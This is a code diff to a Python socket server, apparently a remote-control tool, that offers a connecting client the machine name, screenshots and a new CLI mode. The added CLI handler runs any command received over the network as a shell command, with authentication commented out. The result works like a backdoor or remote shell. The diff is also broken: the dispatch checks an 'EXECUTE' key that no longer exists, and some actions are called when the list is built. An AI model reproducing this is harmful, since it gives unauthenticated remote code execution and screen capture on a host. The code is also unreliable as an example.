@@ -19,8 +19,7 @@ class Server:
             {"NAME":        getComputerName},
             {"EXIT":        self.closeConnection()},
             {"SCREENSHOT":  screenObject.ScreenShots()},
-            {"EXECUTE":     "time method"},
-            {"DIR_CONTENT": "time method"},
+            {"CLI":         self.handleCLIrequests},
         ]
 
         # Code Section
@@ -50,19 +49,21 @@ class Server:
         # authMessage = clientFD.recv(1024)
         # self.auth.authenticate(authMessage, self.auth)
 
-        self.send(clientFD, self.actionsToString())                 # Send actions list to client
+        self.send(clientFD, self.actionsToString())                     # Send actions list to client
         while(True):
-            actionIndex = self.receive(clientFD)                    # Receive action from client
-            response = self.performAction(int(actionIndex))         # Perform action
+            actionIndex = self.receive(clientFD)                        # Receive action from client
+            response = self.performAction(clientFD, int(actionIndex))   # Perform action
             self.send(clientFD, response)
 
 
-    def performAction(self, actionIndex):
+    def performAction(self, clientFD, actionIndex):
         # Variable Definition
         actionDict  = self.actions[actionIndex]
         dictKey     = next(iter(actionDict)) # Get first dict key
 
         # Code Section
+        if(dictKey == "EXECUTE"):
+            return actionDict[dictKey](clientFD)
         return actionDict[dictKey]
 
 
@@ -92,6 +93,23 @@ class Server:
         # TODO - kill/stop thread & close socket
         # Code Section
         return Utilities.getResponseObject(True, "Bye Bye")
+
+    def handleCLIrequests(self, clientFD):
+        # Variable Definition
+        command                 = None
+        welcomeMsg              = "Welcome to Huri's CLI\n"
+        waitingforCommandMsg    = "Please write a command or type 'exit' to quit CLI...\n"
+
+        # Code Section
+        self.send(clientFD, welcomeMsg)
+        while(command != "exit"):
+            self.send(clientFD, waitingforCommandMsg)
+            command = self.receive(clientFD)
+            result  = runShellCommand(command)
+            self.send(clientFD, result)
+
+
+
 
 
 server = Server(8080) # Init server socket
